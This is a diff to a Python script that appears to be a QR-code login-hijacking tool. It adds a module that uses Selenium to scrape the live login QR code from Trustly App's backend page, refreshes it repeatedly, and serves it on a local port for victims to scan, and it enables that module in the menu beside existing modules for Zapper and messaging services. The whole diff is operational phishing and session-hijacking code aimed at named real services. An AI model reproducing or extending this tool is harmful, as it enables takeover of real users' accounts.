@@ -306,12 +306,35 @@ def Zapper():
 	print " [+]Navigating To Website.."
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
-	title = driver.title.encode("utf-8")
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			c = web.find_elements_by_id("qrcodecontainer2")
 			img = c[0].find_elements_by_tag_name("img")[0]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(15)
+			continue
+		except:
+			if "Login" not in driver.title.encode("utf-8"):
+				break
+			else:
+				driver.refresh()
+
+def Trustly_App():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://trustlyapp.com/backend")
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			c = web.find_elements_by_class_name("qrcode-tab")[0]
+			img = c.find_elements_by_tag_name("img")[0]
 			print " [+]The QR code image found !"
 			src = img.get_attribute('src')
 			print " [+]Downloading the image.."
@@ -395,7 +418,7 @@ def main():
   5.Passport Services
   6.Mobile Management Software
   7.Other Services
-  8.Customization
+  8.Customization [Soon]
 """
 	choice = input(" Choice > ")
 
@@ -406,7 +429,7 @@ def main():
  2.WeChat
  3.Line     [Soon]
  4.Weibo
- 5.QQ Instant Messaging
+ 5.QQ Instant Messaging [Soon]
  00.Back To Main Menu
 	"""
 
@@ -459,6 +482,7 @@ def main():
 			Weibo()
 			main()
 
+		#not finished yet
 		elif int(choice_2) == 5:
 			port = raw_input(" Port to listen on (Default 1337) : ")
 			try:
@@ -638,7 +662,7 @@ def main():
 		print """
  1.MyDigiPass
  2.Zapper
- 3.Trustly App [Soon]
+ 3.Trustly App
  4.Yelophone [Soon]
  5.Alibaba Yunos [Soon]
  00.Back To Main Menu [Soon]
@@ -677,9 +701,24 @@ def main():
 			Zapper()
 			main()
 
+		elif int(choice_2) == 3:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Trustly_App()
+			main()
+
 	#Customization
 	#if choice == 8:
-		#settings.read("Data/Simple.ini")
+		#settings.read("Data/Custom.ini")
 		#url = settings.get("WeChat","url")
 		#image_number = settings.get("WeChat","image_number")
 		#classname = settings.get("WeChat","classname")
